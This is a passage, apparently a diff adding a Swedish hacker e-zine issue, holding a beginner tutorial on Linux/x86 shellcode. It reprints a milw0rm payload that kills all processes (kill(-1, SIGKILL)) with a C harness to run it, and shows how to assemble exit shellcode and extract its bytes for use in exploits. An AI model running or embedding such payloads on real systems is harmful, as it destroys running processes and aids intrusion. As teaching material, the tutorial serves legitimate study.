+#include <stdlib.h>
+int main() {
+      char scode[] = "SKALKÅÅÅD"; // Skriv in shellcode.
+      (*(void (*)()) scode)();
+}
+
+
+Läs igenom denhär och försök förstå vad den hör, kan du redan C så kommer du
+inte ha några problem med detta. Men vad den gör är att det exekverar våran
+shellcode för att vara mer exakt så castar vi pekaren till shellcoden till
+en funktionspekare som sedan avrefereras (mer eller mindre).
+
+Vi måste först förstå vad shellcode är, för att förklara det simpelt är det en
+hex kod utav ett assembler program som du kan använda som en sk. payload och
+ur den kan du sedan köra utvalda kommandon. Säg att du just skrivit en exploit
+som utnyttjar en rad kod i en deamon på en Linux dator. För att utnyttja denhär
+koden på riktigt vill du på något sätt kunna exekvera kommandon genom den!
+
+*******************************************************************************
+Exploit förklarning.
+*******************************************************************************
+
+Låt oss säga att Dator A kör en version av Apache som innehåller en bugg. Denna
+bugg kan du utnyttja med hjälp av en exploit och på så sätt injicera kod in i
+minnet som sedan exekveras på Dator A precis som ett vanligt kommando.
+
+Jag pratar då inte om en injicering i form av tekniker som rootkit använder
+t.ex. WriteProcessMemory eller dyl. sätt. Utan jag talar om en buffert overflow
+som alltså är att skriva över gränsen på en buffer som då ger lite olika
+resultat. Men detta är utanför den här artikeln.
+
+Med såhär långt? I dethär fallet körs Apache utav ROOT och detta innebär att om
+apache skulle göra något så gör den det som ROOT. Dvs. om vi får Apache att
+skapa en ny användare med ROOT rättigheter som heter TOOR skulle detta göra som
+ROOT och det skulle bli en succes!
+
+Detta är en väldigt simpel förklarning hur en exploit fungerar och den bör
+vara nog för att du ska förstå denhär texten i alla fall. Vi du skaffa dig
+djupare kunskap så finns det mycket info ute på nätet.
+
+(Jag är medveten om att root stavas med småbokstäver och jag stavar det med
+stora för att jag vill och för att jag tycker det ser bra ut ;( )
+
+*******************************************************************************
+
+*******************************************************************************
+
+Låt oss nu skaffa oss en exempel kod ifrån milw0rm.com jag valde att ta en
+liten kod på enbart 11 bytes som dödar alla processer under Linux (med x86 CPU)
+för att demostera hur allvarligt det är med exploits och visa vilken makt
+en angripare har.
+
+*******************************************************************************
+linux/x86 kill all processes 11 bytes
+*******************************************************************************
+
+/* By Kris Katterjohn 11/13/2006
+ *
+ * 11 byte shellcode to kill all processes for Linux/x86
+ *
+ *
+ *
+ * section .text
+ *
+ *      global _start
+ *
+ * _start:
+ *
+ * ; kill(-1, SIGKILL)
+ *
+ *      push byte 37
+ *      pop eax
+ *      push byte -1
+ *      pop ebx
+ *      push byte 9
+ *      pop ecx
+ *      int 0x80
+ */
+
+main()
+{
+       char shellcode[] = "\x6a\x25\x58\x6a\xff\x5b\x6a\x09\x59\xcd\x80";
+
+       (*(void (*)()) shellcode)();
+}
+
+// milw0rm.com [2007-03-09] http://www.milw0rm.com/shellcode/3446
+
+
+*******************************************************************************
+
+*******************************************************************************
+
+Som du antadligen förstod så är \x6a\x25\x58\x6a\xff\x5b\x6a\x09\x59\xcd\x80
+den delen i denhär koden som är själva shellcoden. Ovanför koden finns det en
+kommentar innehållande en kod skriven i ASM som då är vad shellcoden gör.
+
+*******************************************************************************
+Linux system anrop /* SYSCALL */
+*******************************************************************************
+
+Shellcode innehåller alltså direktiv till en sak vi vill utföra, och detta
+fungerar effektivt pga. "syscalls". I en Linux kärna finns ca. 190 olika kall
+med ett numerärt id som du kan kalla med assembly instruktioner (kod/er).
+Du kan kolla hur många du har efter som detta är lite beroende på din kärna.
+
+   [h4xb0x] ~> grep NR_syscalls /usr/include/asm/unistd.h 
+   #define NR_syscalls 190
+
+Låt oss kolla på ett system kall som stänger ett program. Här har du ASM kod:
+
+    mov al, 1
+
+Notera: att jag nu självklart pratar om ett x86 system dvs. att detta inte är
+likadant på andra CPU arkitekturer! (2)
+
+För att förstå vad denhär koden gör behöver du lite kunskap om x86 Assembler.
+Läs swestres guide om ASM för djupare kunskap! Jag är medveten om att min
+ASM kod inte är den bästa och att det finns bättre sätt som t.ex. att använda
+EAX istället fär AL osv. men ASM är utanför denhär guiden.
+
+Som vi nu vet så kallar den där koden efter en syscall med ID 1 som allstå är
+EXIT (/usr/src/linux/kernel/exit.c) i "al", som är den 8bits lägre delen av
+registret. Detta betyder att vi kan kontakta linux kärnan med kommandot:
+
+    int 0x80
+
+Detta är en standard i alla Linux system som tillåter oss att skriva shellcode.
+
+Nu när vi faktiskt har en grundlig kunskap i ASM och vad shellcode är så vill
+vi skriva en liten kod som vi sedan ska konventera till HEX kod och sedan ha
+en fungerande shellcode.
+
+; exit_syscall.asm
+[SECTION .text]
+global _start
+_start:
+       xor eax, eax
+       mov al, 1
+       xor ebx, ebx
+       int 0x80
+
+Med den kunskapen du har kan du fundera ut vad den här koden gör och du kommer
+antadligen också kunna klura ut vad många använda shellkoder också gör.
+För en mer grundlig förklarning utav vad koden gör så läser du swestres guide.
+
+Kompilera:
+
+  [h4xb0x] ~> nasm -f elf exit.asm
+  [h4xb0x] ~> ld -o exit_syscall exit.o
+  [h4xb0x] ~> ./exit_syscall
+
+Vårat program kommer inte göra något, utan kommer bara avsluta sig sjäv utan
+ERROR. Vi har faktiskt en helt fungerande kod som vi kan använda för att remote
+eller lokalt utnyttja en säkerhets brist i valfritt program. Nu vill vi använda
+en dissassembler som heter objdump (okej det är ett program för att kolla
+objectfiler egentligen men det är lite utav en dissassembler också)
+
+  [h4xb0x] ~> objdump -d exit_syscall
+
+  exit_syscall: file format elf32-i386
+  Disassembly of section .text:
+              08048080 <_start>:
+              8048080: 31 c0 xor %eax,%eax
+              8048082: b0 01 mov $0x1,%al
+              8048084: 31 db xor %ebx,%ebx
+              8048086: cd 80 int $0x80
+
+Det viktiga i denhär koden är delen som skriver ut detta:
+  
+  31 c0
+  b0 01
+  31 db
+  cd 80
+
+För att skriva våran shellcode gör vi följande:
+
+              \x31\xc0\xb0\x01\x31\xdb\xcd\x80
+
+Våran kod blir följande:
+
+#include <stdio.h>
+#include <stdlib.h>
+int main() {
+      char scode[] = "\x31\xc0\xb0\x01\x31\xdb\xcd\x80"; // OMG OMG!!.
+      (*(void (*)()) scode)();
+}
+
+Grattis du klarade av att skriva din första shellcode. Nästa gång skriver
+jag ev. om detta igen men då tar vi upp det hela ett snäpp!
+Lycka till med dina utforskningar utav din nya kunskap och kom ihåg att
+utveckla dig nu! Smäll upp en Virtual Machine och lek så mycket du bara kan
+en dag kommer vi också gå igenom hur man skriver en sk. buffert overflow!
+
+
+
+================================================================================
+0xFF - The End
+================================================================================
+
+Sådär, du var första numret av HckZine ute efter relativt mycket arbete. Det
+har varit kul att äntligen efter många om och men få ut detta första nummer och
+jag hoppas att vi kommer fortsätta skriva artiklar och att vi fortsätter att
+släppa nya nummer.
+För att detta ska vara möjligt behöver vi eran hjälp, har du en någon artikel
+liggandes på datorn som du aldrig vetat vad du ska göra med? Vill du skriva om
+något som intresserar dig och oss? Skriv ner det och skicka det i ett mail till
+oss på mail adressen hckzine@gmail.com .
+Har du kritik går den till /dev/null, nejdå, vi tar emot kritik på samma adress
+som ovan men blir mycket gladare om ni skickar lite trevliga frågor, rättelser,
+beröm, avgudningar, naken bilder på era flickvänner osv. ;)
+
+Ha det bra och jag vill också i och med den här rellen berätta att hackenstein
+åter igen är öppen för registrering så vart du nu en må befinna dig i på iNet
+så är det fritt fram att registrera sig nu! \o/
+
+          [- http://hackenstein.se - http://www.hacktivism.nu -]
+                             18:36 01.01.2008
